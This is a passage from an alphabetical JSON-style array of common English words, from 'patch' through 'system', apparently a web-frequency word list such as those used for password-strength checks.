			"patch",
			"patches",
			"patent",
			"patents",
			"path",
			"pathology",
			"paths",
			"patient",
			"patients",
			"patio",
			"patricia",
			"patrick",
			"patrol",
			"pattern",
			"patterns",
			"paul",
			"pavilion",
			"paxil",
			"pay",
			"payable",
			"payday",
			"paying",
			"payment",
			"payments",
			"paypal",
			"payroll",
			"pays",
			"pb",
			"pc",
			"pci",
			"pcs",
			"pct",
			"pd",
			"pda",
			"pdas",
			"pdf",
			"pdt",
			"pe",
			"peace",
			"peaceful",
			"peak",
			"pearl",
			"peas",
			"pediatric",
			"pee",
			"peeing",
			"peer",
			"peers",
			"pen",
			"penalties",
			"penalty",
			"pencil",
			"pendant",
			"pending",
			"penetration",
			"penguin",
			"peninsula",
			"penis",
			"penn",
			"pennsylvania",
			"penny",
			"pens",
			"pension",
			"pensions",
			"pentium",
			"people",
			"peoples",
			"pepper",
			"per",
			"perceived",
			"percent",
			"percentage",
			"perception",
			"perfect",
			"perfectly",
			"perform",
			"performance",
			"performances",
			"performed",
			"performer",
			"performing",
			"performs",
			"perfume",
			"perhaps",
			"period",
			"periodic",
			"periodically",
			"periods",
			"peripheral",
			"peripherals",
			"perl",
			"permalink",
			"permanent",
			"permission",
			"permissions",
			"permit",
			"permits",
			"permitted",
			"perry",
			"persian",
			"persistent",
			"person",
			"personal",
			"personality",
			"personalized",
			"personally",
			"personals",
			"personnel",
			"persons",
			"perspective",
			"perspectives",
			"perth",
			"peru",
			"pest",
			"pet",
			"pete",
			"peter",
			"petersburg",
			"peterson",
			"petite",
			"petition",
			"petroleum",
			"pets",
			"pf",
			"pg",
			"pgp",
			"ph",
			"phantom",
			"pharmaceutical",
			"pharmaceuticals",
			"pharmacies",
			"pharmacology",
			"pharmacy",
			"phase",
			"phases",
			"phd",
			"phenomenon",
			"phentermine",
			"phi",
			"phil",
			"philadelphia",
			"philip",
			"philippines",
			"philips",
			"phillips",
			"philosophy",
			"phoenix",
			"phone",
			"phones",
			"photo",
			"photograph",
			"photographer",
			"photographers",
			"photographic",
			"photographs",
			"photography",
			"photos",
			"photoshop",
			"php",
			"phpbb",
			"phrase",
			"phrases",
			"phys",
			"physical",
			"physically",
			"physician",
			"physicians",
			"physics",
			"physiology",
			"pi",
			"piano",
			"pic",
			"pichunter",
			"pick",
			"picked",
			"picking",
			"picks",
			"pickup",
			"picnic",
			"pics",
			"picture",
			"pictures",
			"pie",
			"piece",
			"pieces",
			"pierce",
			"pierre",
			"pig",
			"pike",
			"pill",
			"pillow",
			"pills",
			"pilot",
			"pin",
			"pine",
			"ping",
			"pink",
			"pins",
			"pioneer",
			"pipe",
			"pipeline",
			"pipes",
			"pirates",
			"piss",
			"pissing",
			"pit",
			"pitch",
			"pittsburgh",
			"pix",
			"pixel",
			"pixels",
			"pizza",
			"pj",
			"pk",
			"pl",
			"place",
			"placed",
			"placement",
			"places",
			"placing",
			"plain",
			"plains",
			"plaintiff",
			"plan",
			"plane",
			"planes",
			"planet",
			"planets",
			"planned",
			"planner",
			"planners",
			"planning",
			"plans",
			"plant",
			"plants",
			"plasma",
			"plastic",
			"plastics",
			"plate",
			"plates",
			"platform",
			"platforms",
			"platinum",
			"play",
			"playback",
			"playboy",
			"played",
			"player",
			"players",
			"playing",
			"playlist",
			"plays",
			"playstation",
			"plaza",
			"plc",
			"pleasant",
			"please",
			"pleased",
			"pleasure",
			"pledge",
			"plenty",
			"plot",
			"plots",
			"plug",
			"plugin",
			"plugins",
			"plumbing",
			"plus",
			"plymouth",
			"pm",
			"pmc",
			"pmid",
			"pn",
			"po",
			"pocket",
			"pockets",
			"pod",
			"podcast",
			"podcasts",
			"poem",
			"poems",
			"poet",
			"poetry",
			"point",
			"pointed",
			"pointer",
			"pointing",
			"points",
			"pokemon",
			"poker",
			"poland",
			"polar",
			"pole",
			"police",
			"policies",
			"policy",
			"polish",
			"polished",
			"political",
			"politicians",
			"politics",
			"poll",
			"polls",
			"pollution",
			"polo",
			"poly",
			"polyester",
			"polymer",
			"polyphonic",
			"pond",
			"pontiac",
			"pool",
			"pools",
			"poor",
			"pop",
			"pope",
			"popular",
			"popularity",
			"population",
			"populations",
			"por",
			"porcelain",
			"pork",
			"porn",
			"porno",
			"porsche",
			"port",
			"portable",
			"portal",
			"porter",
			"portfolio",
			"portion",
			"portions",
			"portland",
			"portrait",
			"portraits",
			"ports",
			"portsmouth",
			"portugal",
			"portuguese",
			"pos",
			"pose",
			"posing",
			"position",
			"positioning",
			"positions",
			"positive",
			"possess",
			"possession",
			"possibilities",
			"possibility",
			"possible",
			"possibly",
			"post",
			"postage",
			"postal",
			"postcard",
			"postcards",
			"posted",
			"poster",
			"posters",
			"posting",
			"postings",
			"postposted",
			"posts",
			"pot",
			"potato",
			"potatoes",
			"potential",
			"potentially",
			"potter",
			"pottery",
			"poultry",
			"pound",
			"pounds",
			"pour",
			"poverty",
			"powder",
			"powell",
			"power",
			"powered",
			"powerful",
			"powerpoint",
			"powers",
			"powerseller",
			"pp",
			"ppc",
			"ppm",
			"pr",
			"practical",
			"practice",
			"practices",
			"practitioner",
			"practitioners",
			"prague",
			"prairie",
			"praise",
			"pray",
			"prayer",
			"prayers",
			"pre",
			"preceding",
			"precious",
			"precipitation",
			"precise",
			"precisely",
			"precision",
			"predict",
			"predicted",
			"prediction",
			"predictions",
			"prefer",
			"preference",
			"preferences",
			"preferred",
			"prefers",
			"prefix",
			"pregnancy",
			"pregnant",
			"preliminary",
			"premier",
			"premiere",
			"premises",
			"premium",
			"prep",
			"prepaid",
			"preparation",
			"prepare",
			"prepared",
			"preparing",
			"prerequisite",
			"prescribed",
			"prescription",
			"presence",
			"present",
			"presentation",
			"presentations",
			"presented",
			"presenting",
			"presently",
			"presents",
			"preservation",
			"preserve",
			"president",
			"presidential",
			"press",
			"pressed",
			"pressing",
			"pressure",
			"preston",
			"pretty",
			"prev",
			"prevent",
			"preventing",
			"prevention",
			"preview",
			"previews",
			"previous",
			"previously",
			"price",
			"priced",
			"prices",
			"pricing",
			"pride",
			"priest",
			"primarily",
			"primary",
			"prime",
			"prince",
			"princess",
			"princeton",
			"principal",
			"principle",
			"principles",
			"print",
			"printable",
			"printed",
			"printer",
			"printers",
			"printing",
			"prints",
			"prior",
			"priorities",
			"priority",
			"prison",
			"prisoner",
			"prisoners",
			"privacy",
			"private",
			"privilege",
			"privileges",
			"prix",
			"prize",
			"prizes",
			"pro",
			"probability",
			"probably",
			"probe",
			"problem",
			"problems",
			"proc",
			"procedure",
			"procedures",
			"proceed",
			"proceeding",
			"proceedings",
			"proceeds",
			"process",
			"processed",
			"processes",
			"processing",
			"processor",
			"processors",
			"procurement",
			"produce",
			"produced",
			"producer",
			"producers",
			"produces",
			"producing",
			"product",
			"production",
			"productions",
			"productive",
			"productivity",
			"products",
			"prof",
			"profession",
			"professional",
			"professionals",
			"professor",
			"profile",
			"profiles",
			"profit",
			"profits",
			"program",
			"programme",
			"programmer",
			"programmers",
			"programmes",
			"programming",
			"programs",
			"progress",
			"progressive",
			"prohibited",
			"project",
			"projected",
			"projection",
			"projector",
			"projectors",
			"projects",
			"prominent",
			"promise",
			"promised",
			"promises",
			"promising",
			"promo",
			"promote",
			"promoted",
			"promotes",
			"promoting",
			"promotion",
			"promotional",
			"promotions",
			"prompt",
			"promptly",
			"proof",
			"propecia",
			"proper",
			"properly",
			"properties",
			"property",
			"prophet",
			"proportion",
			"proposal",
			"proposals",
			"propose",
			"proposed",
			"proposition",
			"proprietary",
			"pros",
			"prospect",
			"prospective",
			"prospects",
			"prostate",
			"prostores",
			"prot",
			"protect",
			"protected",
			"protecting",
			"protection",
			"protective",
			"protein",
			"proteins",
			"protest",
			"protocol",
			"protocols",
			"prototype",
			"proud",
			"proudly",
			"prove",
			"proved",
			"proven",
			"provide",
			"provided",
			"providence",
			"provider",
			"providers",
			"provides",
			"providing",
			"province",
			"provinces",
			"provincial",
			"provision",
			"provisions",
			"proxy",
			"prozac",
			"ps",
			"psi",
			"psp",
			"pst",
			"psychiatry",
			"psychological",
			"psychology",
			"pt",
			"pts",
			"pty",
			"pub",
			"public",
			"publication",
			"publications",
			"publicity",
			"publicly",
			"publish",
			"published",
			"publisher",
			"publishers",
			"publishing",
			"pubmed",
			"pubs",
			"puerto",
			"pull",
			"pulled",
			"pulling",
			"pulse",
			"pump",
			"pumps",
			"punch",
			"punishment",
			"punk",
			"pupils",
			"puppy",
			"purchase",
			"purchased",
			"purchases",
			"purchasing",
			"pure",
			"purple",
			"purpose",
			"purposes",
			"purse",
			"pursuant",
			"pursue",
			"pursuit",
			"push",
			"pushed",
			"pushing",
			"pussy",
			"put",
			"puts",
			"putting",
			"puzzle",
			"puzzles",
			"pvc",
			"python",
			"q",
			"qatar",
			"qc",
			"qld",
			"qt",
			"qty",
			"quad",
			"qualification",
			"qualifications",
			"qualified",
			"qualify",
			"qualifying",
			"qualities",
			"quality",
			"quantitative",
			"quantities",
			"quantity",
			"quantum",
			"quarter",
			"quarterly",
			"quarters",
			"que",
			"quebec",
			"queen",
			"queens",
			"queensland",
			"queries",
			"query",
			"quest",
			"question",
			"questionnaire",
			"questions",
			"queue",
			"qui",
			"quick",
			"quickly",
			"quiet",
			"quilt",
			"quit",
			"quite",
			"quiz",
			"quizzes",
			"quotations",
			"quote",
			"quoted",
			"quotes",
			"r",
			"ra",
			"rabbit",
			"race",
			"races",
			"rachel",
			"racial",
			"racing",
			"rack",
			"racks",
			"radar",
			"radiation",
			"radical",
			"radio",
			"radios",
			"radius",
			"rage",
			"raid",
			"rail",
			"railroad",
			"railway",
			"rain",
			"rainbow",
			"raise",
			"raised",
			"raises",
			"raising",
			"raleigh",
			"rally",
			"ralph",
			"ram",
			"ran",
			"ranch",
			"rand",
			"random",
			"randy",
			"range",
			"rangers",
			"ranges",
			"ranging",
			"rank",
			"ranked",
			"ranking",
			"rankings",
			"ranks",
			"rap",
			"rape",
			"rapid",
			"rapidly",
			"rapids",
			"rare",
			"rarely",
			"rat",
			"rate",
			"rated",
			"rates",
			"rather",
			"rating",
			"ratings",
			"ratio",
			"rational",
			"ratios",
			"rats",
			"raw",
			"ray",
			"raymond",
			"rays",
			"rb",
			"rc",
			"rca",
			"rd",
			"re",
			"reach",
			"reached",
			"reaches",
			"reaching",
			"reaction",
			"reactions",
			"read",
			"reader",
			"readers",
			"readily",
			"reading",
			"readings",
			"reads",
			"ready",
			"real",
			"realistic",
			"reality",
			"realize",
			"realized",
			"really",
			"realm",
			"realtor",
			"realtors",
			"realty",
			"rear",
			"reason",
			"reasonable",
			"reasonably",
			"reasoning",
			"reasons",
			"rebate",
			"rebates",
			"rebecca",
			"rebel",
			"rebound",
			"rec",
			"recall",
			"receipt",
			"receive",
			"received",
			"receiver",
			"receivers",
			"receives",
			"receiving",
			"recent",
			"recently",
			"reception",
			"receptor",
			"receptors",
			"recipe",
			"recipes",
			"recipient",
			"recipients",
			"recognised",
			"recognition",
			"recognize",
			"recognized",
			"recommend",
			"recommendation",
			"recommendations",
			"recommended",
			"recommends",
			"reconstruction",
			"record",
			"recorded",
			"recorder",
			"recorders",
			"recording",
			"recordings",
			"records",
			"recover",
			"recovered",
			"recovery",
			"recreation",
			"recreational",
			"recruiting",
			"recruitment",
			"recycling",
			"red",
			"redeem",
			"redhead",
			"reduce",
			"reduced",
			"reduces",
			"reducing",
			"reduction",
			"reductions",
			"reed",
			"reef",
			"reel",
			"ref",
			"refer",
			"reference",
			"referenced",
			"references",
			"referral",
			"referrals",
			"referred",
			"referring",
			"refers",
			"refinance",
			"refine",
			"refined",
			"reflect",
			"reflected",
			"reflection",
			"reflections",
			"reflects",
			"reform",
			"reforms",
			"refresh",
			"refrigerator",
			"refugees",
			"refund",
			"refurbished",
			"refuse",
			"refused",
			"reg",
			"regard",
			"regarded",
			"regarding",
			"regardless",
			"regards",
			"reggae",
			"regime",
			"region",
			"regional",
			"regions",
			"register",
			"registered",
			"registrar",
			"registration",
			"registry",
			"regression",
			"regular",
			"regularly",
			"regulated",
			"regulation",
			"regulations",
			"regulatory",
			"rehab",
			"rehabilitation",
			"reid",
			"reject",
			"rejected",
			"rel",
			"relate",
			"related",
			"relates",
			"relating",
			"relation",
			"relations",
			"relationship",
			"relationships",
			"relative",
			"relatively",
			"relatives",
			"relax",
			"relaxation",
			"relay",
			"release",
			"released",
			"releases",
			"relevance",
			"relevant",
			"reliability",
			"reliable",
			"reliance",
			"relief",
			"religion",
			"religions",
			"religious",
			"reload",
			"relocation",
			"rely",
			"relying",
			"remain",
			"remainder",
			"remained",
			"remaining",
			"remains",
			"remark",
			"remarkable",
			"remarks",
			"remedies",
			"remedy",
			"remember",
			"remembered",
			"remind",
			"reminder",
			"remix",
			"remote",
			"removable",
			"removal",
			"remove",
			"removed",
			"removing",
			"renaissance",
			"render",
			"rendered",
			"rendering",
			"renew",
			"renewable",
			"renewal",
			"reno",
			"rent",
			"rental",
			"rentals",
			"rentcom",
			"rep",
			"repair",
			"repairs",
			"repeat",
			"repeated",
			"replace",
			"replaced",
			"replacement",
			"replacing",
			"replica",
			"replication",
			"replied",
			"replies",
			"reply",
			"report",
			"reported",
			"reporter",
			"reporters",
			"reporting",
			"reports",
			"repository",
			"represent",
			"representation",
			"representations",
			"representative",
			"representatives",
			"represented",
			"representing",
			"represents",
			"reprint",
			"reprints",
			"reproduce",
			"reproduced",
			"reproduction",
			"reproductive",
			"republic",
			"republican",
			"republicans",
			"reputation",
			"request",
			"requested",
			"requesting",
			"requests",
			"require",
			"required",
			"requirement",
			"requirements",
			"requires",
			"requiring",
			"res",
			"rescue",
			"research",
			"researcher",
			"researchers",
			"reseller",
			"reservation",
			"reservations",
			"reserve",
			"reserved",
			"reserves",
			"reservoir",
			"reset",
			"residence",
			"resident",
			"residential",
			"residents",
			"resist",
			"resistance",
			"resistant",
			"resolution",
			"resolutions",
			"resolve",
			"resolved",
			"resort",
			"resorts",
			"resource",
			"resources",
			"respect",
			"respected",
			"respective",
			"respectively",
			"respiratory",
			"respond",
			"responded",
			"respondent",
			"respondents",
			"responding",
			"response",
			"responses",
			"responsibilities",
			"responsibility",
			"responsible",
			"rest",
			"restaurant",
			"restaurants",
			"restoration",
			"restore",
			"restored",
			"restrict",
			"restricted",
			"restriction",
			"restrictions",
			"restructuring",
			"result",
			"resulted",
			"resulting",
			"results",
			"resume",
			"resumes",
			"retail",
			"retailer",
			"retailers",
			"retain",
			"retained",
			"retention",
			"retired",
			"retirement",
			"retreat",
			"retrieval",
			"retrieve",
			"retrieved",
			"retro",
			"return",
			"returned",
			"returning",
			"returns",
			"reunion",
			"reuters",
			"rev",
			"reveal",
			"revealed",
			"reveals",
			"revelation",
			"revenge",
			"revenue",
			"revenues",
			"reverse",
			"review",
			"reviewed",
			"reviewer",
			"reviewing",
			"reviews",
			"revised",
			"revision",
			"revisions",
			"revolution",
			"revolutionary",
			"reward",
			"rewards",
			"reynolds",
			"rf",
			"rfc",
			"rg",
			"rh",
			"rhode",
			"rhythm",
			"ri",
			"ribbon",
			"rica",
			"rice",
			"rich",
			"richard",
			"richards",
			"richardson",
			"richmond",
			"rick",
			"rico",
			"rid",
			"ride",
			"rider",
			"riders",
			"rides",
			"ridge",
			"riding",
			"right",
			"rights",
			"rim",
			"ring",
			"rings",
			"ringtone",
			"ringtones",
			"rio",
			"rip",
			"ripe",
			"rise",
			"rising",
			"risk",
			"risks",
			"river",
			"rivers",
			"riverside",
			"rj",
			"rl",
			"rm",
			"rn",
			"rna",
			"ro",
			"road",
			"roads",
			"rob",
			"robert",
			"roberts",
			"robertson",
			"robin",
			"robinson",
			"robot",
			"robots",
			"robust",
			"rochester",
			"rock",
			"rocket",
			"rocks",
			"rocky",
			"rod",
			"roger",
			"rogers",
			"roland",
			"role",
			"roles",
			"roll",
			"rolled",
			"roller",
			"rolling",
			"rolls",
			"rom",
			"roman",
			"romance",
			"romania",
			"romantic",
			"rome",
			"ron",
			"ronald",
			"roof",
			"room",
			"roommate",
			"roommates",
			"rooms",
			"root",
			"roots",
			"rope",
			"rosa",
			"rose",
			"roses",
			"ross",
			"roster",
			"rotary",
			"rotation",
			"rouge",
			"rough",
			"roughly",
			"roulette",
			"round",
			"rounds",
			"route",
			"router",
			"routers",
			"routes",
			"routine",
			"routines",
			"routing",
			"rover",
			"row",
			"rows",
			"roy",
			"royal",
			"royalty",
			"rp",
			"rpg",
			"rpm",
			"rr",
			"rrp",
			"rs",
			"rss",
			"rt",
			"ru",
			"rubber",
			"ruby",
			"rug",
			"rugby",
			"rugs",
			"rule",
			"ruled",
			"rules",
			"ruling",
			"run",
			"runner",
			"running",
			"runs",
			"runtime",
			"rural",
			"rush",
			"russell",
			"russia",
			"russian",
			"ruth",
			"rv",
			"rw",
			"rwanda",
			"rx",
			"ryan",
			"s",
			"sa",
			"sacramento",
			"sacred",
			"sacrifice",
			"sad",
			"saddam",
			"safari",
			"safe",
			"safely",
			"safer",
			"safety",
			"sage",
			"sagem",
			"said",
			"sail",
			"sailing",
			"saint",
			"saints",
			"sake",
			"salad",
			"salaries",
			"salary",
			"sale",
			"salem",
			"sales",
			"sally",
			"salmon",
			"salon",
			"salt",
			"salvador",
			"salvation",
			"sam",
			"samba",
			"same",
			"samoa",
			"sample",
			"samples",
			"sampling",
			"samsung",
			"samuel",
			"san",
			"sand",
			"sandra",
			"sandwich",
			"sandy",
			"sans",
			"santa",
			"sanyo",
			"sao",
			"sap",
			"sapphire",
			"sara",
			"sarah",
			"sas",
			"saskatchewan",
			"sat",
			"satellite",
			"satin",
			"satisfaction",
			"satisfactory",
			"satisfied",
			"satisfy",
			"saturday",
			"saturn",
			"sauce",
			"saudi",
			"savage",
			"savannah",
			"save",
			"saved",
			"saver",
			"saves",
			"saving",
			"savings",
			"saw",
			"say",
			"saying",
			"says",
			"sb",
			"sbjct",
			"sc",
			"scale",
			"scales",
			"scan",
			"scanned",
			"scanner",
			"scanners",
			"scanning",
			"scary",
			"scenario",
			"scenarios",
			"scene",
			"scenes",
			"scenic",
			"schedule",
			"scheduled",
			"schedules",
			"scheduling",
			"schema",
			"scheme",
			"schemes",
			"scholar",
			"scholars",
			"scholarship",
			"scholarships",
			"school",
			"schools",
			"sci",
			"science",
			"sciences",
			"scientific",
			"scientist",
			"scientists",
			"scoop",
			"scope",
			"score",
			"scored",
			"scores",
			"scoring",
			"scotia",
			"scotland",
			"scott",
			"scottish",
			"scout",
			"scratch",
			"screen",
			"screening",
			"screens",
			"screensaver",
			"screensavers",
			"screenshot",
			"screenshots",
			"screw",
			"script",
			"scripting",
			"scripts",
			"scroll",
			"scsi",
			"scuba",
			"sculpture",
			"sd",
			"se",
			"sea",
			"seafood",
			"seal",
			"sealed",
			"sean",
			"search",
			"searchcom",
			"searched",
			"searches",
			"searching",
			"seas",
			"season",
			"seasonal",
			"seasons",
			"seat",
			"seating",
			"seats",
			"seattle",
			"sec",
			"second",
			"secondary",
			"seconds",
			"secret",
			"secretariat",
			"secretary",
			"secrets",
			"section",
			"sections",
			"sector",
			"sectors",
			"secure",
			"secured",
			"securely",
			"securities",
			"security",
			"see",
			"seed",
			"seeds",
			"seeing",
			"seek",
			"seeker",
			"seekers",
			"seeking",
			"seeks",
			"seem",
			"seemed",
			"seems",
			"seen",
			"sees",
			"sega",
			"segment",
			"segments",
			"select",
			"selected",
			"selecting",
			"selection",
			"selections",
			"selective",
			"self",
			"sell",
			"seller",
			"sellers",
			"selling",
			"sells",
			"semester",
			"semi",
			"semiconductor",
			"seminar",
			"seminars",
			"sen",
			"senate",
			"senator",
			"senators",
			"send",
			"sender",
			"sending",
			"sends",
			"senegal",
			"senior",
			"seniors",
			"sense",
			"sensitive",
			"sensitivity",
			"sensor",
			"sensors",
			"sent",
			"sentence",
			"sentences",
			"seo",
			"sep",
			"separate",
			"separated",
			"separately",
			"separation",
			"sept",
			"september",
			"seq",
			"sequence",
			"sequences",
			"ser",
			"serbia",
			"serial",
			"series",
			"serious",
			"seriously",
			"serum",
			"serve",
			"served",
			"server",
			"servers",
			"serves",
			"service",
			"services",
			"serving",
			"session",
			"sessions",
			"set",
			"sets",
			"setting",
			"settings",
			"settle",
			"settled",
			"settlement",
			"setup",
			"seven",
			"seventh",
			"several",
			"severe",
			"sewing",
			"sex",
			"sexcam",
			"sexo",
			"sexual",
			"sexuality",
			"sexually",
			"sexy",
			"sf",
			"sg",
			"sh",
			"shade",
			"shades",
			"shadow",
			"shadows",
			"shaft",
			"shake",
			"shakespeare",
			"shakira",
			"shall",
			"shame",
			"shanghai",
			"shannon",
			"shape",
			"shaped",
			"shapes",
			"share",
			"shared",
			"shareholders",
			"shares",
			"shareware",
			"sharing",
			"shark",
			"sharon",
			"sharp",
			"shaved",
			"shaw",
			"she",
			"shed",
			"sheep",
			"sheer",
			"sheet",
			"sheets",
			"sheffield",
			"shelf",
			"shell",
			"shelter",
			"shemale",
			"shemales",
			"shepherd",
			"sheriff",
			"sherman",
			"shield",
			"shift",
			"shine",
			"ship",
			"shipment",
			"shipments",
			"shipped",
			"shipping",
			"ships",
			"shirt",
			"shirts",
			"shit",
			"shock",
			"shoe",
			"shoes",
			"shoot",
			"shooting",
			"shop",
			"shopper",
			"shoppercom",
			"shoppers",
			"shopping",
			"shoppingcom",
			"shops",
			"shopzilla",
			"shore",
			"short",
			"shortcuts",
			"shorter",
			"shortly",
			"shorts",
			"shot",
			"shots",
			"should",
			"shoulder",
			"show",
			"showcase",
			"showed",
			"shower",
			"showers",
			"showing",
			"shown",
			"shows",
			"showtimes",
			"shut",
			"shuttle",
			"si",
			"sic",
			"sick",
			"side",
			"sides",
			"sie",
			"siemens",
			"sierra",
			"sig",
			"sight",
			"sigma",
			"sign",
			"signal",
			"signals",
			"signature",
			"signatures",
			"signed",
			"significance",
			"significant",
			"significantly",
			"signing",
			"signs",
			"signup",
			"silence",
			"silent",
			"silicon",
			"silk",
			"silly",
			"silver",
			"sim",
			"similar",
			"similarly",
			"simon",
			"simple",
			"simplified",
			"simply",
			"simpson",
			"simpsons",
			"sims",
			"simulation",
			"simulations",
			"simultaneously",
			"sin",
			"since",
			"sing",
			"singapore",
			"singer",
			"singh",
			"singing",
			"single",
			"singles",
			"sink",
			"sip",
			"sir",
			"sister",
			"sisters",
			"sit",
			"site",
			"sitemap",
			"sites",
			"sitting",
			"situated",
			"situation",
			"situations",
			"six",
			"sixth",
			"size",
			"sized",
			"sizes",
			"sk",
			"skating",
			"ski",
			"skiing",
			"skill",
			"skilled",
			"skills",
			"skin",
			"skins",
			"skip",
			"skirt",
			"skirts",
			"sku",
			"sky",
			"skype",
			"sl",
			"slave",
			"sleep",
			"sleeping",
			"sleeps",
			"sleeve",
			"slide",
			"slides",
			"slideshow",
			"slight",
			"slightly",
			"slim",
			"slip",
			"slope",
			"slot",
			"slots",
			"slovak",
			"slovakia",
			"slovenia",
			"slow",
			"slowly",
			"slut",
			"sluts",
			"sm",
			"small",
			"smaller",
			"smart",
			"smell",
			"smile",
			"smilies",
			"smith",
			"smithsonian",
			"smoke",
			"smoking",
			"smooth",
			"sms",
			"smtp",
			"sn",
			"snake",
			"snap",
			"snapshot",
			"snow",
			"snowboard",
			"so",
			"soa",
			"soap",
			"soc",
			"soccer",
			"social",
			"societies",
			"society",
			"sociology",
			"socket",
			"socks",
			"sodium",
			"sofa",
			"soft",
			"softball",
			"software",
			"soil",
			"sol",
			"solar",
			"solaris",
			"sold",
			"soldier",
			"soldiers",
			"sole",
			"solely",
			"solid",
			"solo",
			"solomon",
			"solution",
			"solutions",
			"solve",
			"solved",
			"solving",
			"soma",
			"somalia",
			"some",
			"somebody",
			"somehow",
			"someone",
			"somerset",
			"something",
			"sometimes",
			"somewhat",
			"somewhere",
			"son",
			"song",
			"songs",
			"sonic",
			"sons",
			"sony",
			"soon",
			"soonest",
			"sophisticated",
			"sorry",
			"sort",
			"sorted",
			"sorts",
			"sought",
			"soul",
			"souls",
			"sound",
			"sounds",
			"soundtrack",
			"soup",
			"source",
			"sources",
			"south",
			"southampton",
			"southeast",
			"southern",
			"southwest",
			"soviet",
			"sox",
			"sp",
			"spa",
			"space",
			"spaces",
			"spain",
			"spam",
			"span",
			"spanish",
			"spank",
			"spanking",
			"sparc",
			"spare",
			"spas",
			"spatial",
			"speak",
			"speaker",
			"speakers",
			"speaking",
			"speaks",
			"spears",
			"spec",
			"special",
			"specialist",
			"specialists",
			"specialized",
			"specializing",
			"specially",
			"specials",
			"specialties",
			"specialty",
			"species",
			"specific",
			"specifically",
			"specification",
			"specifications",
			"specifics",
			"specified",
			"specifies",
			"specify",
			"specs",
			"spectacular",
			"spectrum",
			"speech",
			"speeches",
			"speed",
			"speeds",
			"spell",
			"spelling",
			"spencer",
			"spend",
			"spending",
			"spent",
			"sperm",
			"sphere",
			"spice",
			"spider",
			"spies",
			"spin",
			"spine",
			"spirit",
			"spirits",
			"spiritual",
			"spirituality",
			"split",
			"spoke",
			"spoken",
			"spokesman",
			"sponsor",
			"sponsored",
			"sponsors",
			"sponsorship",
			"sport",
			"sporting",
			"sports",
			"spot",
			"spotlight",
			"spots",
			"spouse",
			"spray",
			"spread",
			"spreading",
			"spring",
			"springer",
			"springfield",
			"springs",
			"sprint",
			"spy",
			"spyware",
			"sq",
			"sql",
			"squad",
			"square",
			"squirt",
			"squirting",
			"sr",
			"src",
			"sri",
			"ss",
			"ssl",
			"st",
			"stability",
			"stable",
			"stack",
			"stadium",
			"staff",
			"staffing",
			"stage",
			"stages",
			"stainless",
			"stakeholders",
			"stamp",
			"stamps",
			"stan",
			"stand",
			"standard",
			"standards",
			"standing",
			"standings",
			"stands",
			"stanford",
			"stanley",
			"star",
			"starring",
			"stars",
			"starsmerchant",
			"start",
			"started",
			"starter",
			"starting",
			"starts",
			"startup",
			"stat",
			"state",
			"stated",
			"statement",
			"statements",
			"states",
			"statewide",
			"static",
			"stating",
			"station",
			"stationery",
			"stations",
			"statistical",
			"statistics",
			"stats",
			"status",
			"statute",
			"statutes",
			"statutory",
			"stay",
			"stayed",
			"staying",
			"stays",
			"std",
			"ste",
			"steady",
			"steal",
			"steam",
			"steel",
			"steering",
			"stem",
			"step",
			"stephanie",
			"stephen",
			"steps",
			"stereo",
			"sterling",
			"steve",
			"steven",
			"stevens",
			"stewart",
			"stick",
			"sticker",
			"stickers",
			"sticks",
			"sticky",
			"still",
			"stock",
			"stockholm",
			"stockings",
			"stocks",
			"stolen",
			"stomach",
			"stone",
			"stones",
			"stood",
			"stop",
			"stopped",
			"stopping",
			"stops",
			"storage",
			"store",
			"stored",
			"stores",
			"stories",
			"storm",
			"story",
			"str",
			"straight",
			"strain",
			"strand",
			"strange",
			"stranger",
			"strap",
			"strategic",
			"strategies",
			"strategy",
			"stream",
			"streaming",
			"streams",
			"street",
			"streets",
			"strength",
			"strengthen",
			"strengthening",
			"strengths",
			"stress",
			"stretch",
			"strict",
			"strictly",
			"strike",
			"strikes",
			"striking",
			"string",
			"strings",
			"strip",
			"stripes",
			"strips",
			"stroke",
			"strong",
			"stronger",
			"strongly",
			"struck",
			"struct",
			"structural",
			"structure",
			"structured",
			"structures",
			"struggle",
			"stuart",
			"stuck",
			"stud",
			"student",
			"students",
			"studied",
			"studies",
			"studio",
			"studios",
			"study",
			"studying",
			"stuff",
			"stuffed",
			"stunning",
			"stupid",
			"style",
			"styles",
			"stylish",
			"stylus",
			"su",
			"sub",
			"subaru",
			"subcommittee",
			"subdivision",
			"subject",
			"subjects",
			"sublime",
			"sublimedirectory",
			"submission",
			"submissions",
			"submit",
			"submitted",
			"submitting",
			"subscribe",
			"subscriber",
			"subscribers",
			"subscription",
			"subscriptions",
			"subsection",
			"subsequent",
			"subsequently",
			"subsidiaries",
			"subsidiary",
			"substance",
			"substances",
			"substantial",
			"substantially",
			"substitute",
			"subtle",
			"suburban",
			"succeed",
			"success",
			"successful",
			"successfully",
			"such",
			"suck",
			"sucking",
			"sucks",
			"sudan",
			"sudden",
			"suddenly",
			"sue",
			"suffer",
			"suffered",
			"suffering",
			"sufficient",
			"sufficiently",
			"sugar",
			"suggest",
			"suggested",
			"suggesting",
			"suggestion",
			"suggestions",
			"suggests",
			"suicide",
			"suit",
			"suitable",
			"suite",
			"suited",
			"suites",
			"suits",
			"sullivan",
			"sum",
			"summaries",
			"summary",
			"summer",
			"summit",
			"sun",
			"sunday",
			"sunglasses",
			"sunny",
			"sunrise",
			"sunset",
			"sunshine",
			"super",
			"superb",
			"superintendent",
			"superior",
			"supervision",
			"supervisor",
			"supervisors",
			"supplement",
			"supplemental",
			"supplements",
			"supplied",
			"supplier",
			"suppliers",
			"supplies",
			"supply",
			"support",
			"supported",
			"supporters",
			"supporting",
			"supports",
			"suppose",
			"supposed",
			"supreme",
			"sur",
			"sure",
			"surely",
			"surf",
			"surface",
			"surfaces",
			"surfing",
			"surge",
			"surgeon",
			"surgeons",
			"surgery",
			"surgical",
			"surname",
			"surplus",
			"surprise",
			"surprised",
			"surprising",
			"surrey",
			"surround",
			"surrounded",
			"surrounding",
			"surveillance",
			"survey",
			"surveys",
			"survival",
			"survive",
			"survivor",
			"survivors",
			"susan",
			"suse",
			"suspect",
			"suspected",
			"suspended",
			"suspension",
			"sussex",
			"sustainability",
			"sustainable",
			"sustained",
			"suzuki",
			"sv",
			"sw",
			"swap",
			"sweden",
			"swedish",
			"sweet",
			"swift",
			"swim",
			"swimming",
			"swing",
			"swingers",
			"swiss",
			"switch",
			"switched",
			"switches",
			"switching",
			"switzerland",
			"sword",
			"sydney",
			"symantec",
			"symbol",
			"symbols",
			"sympathy",
			"symphony",
			"symposium",
			"symptoms",
			"sync",
			"syndicate",
			"syndication",
			"syndrome",
			"synopsis",
			"syntax",
			"synthesis",
			"synthetic",
			"syracuse",
			"syria",
			"sys",
			"system",
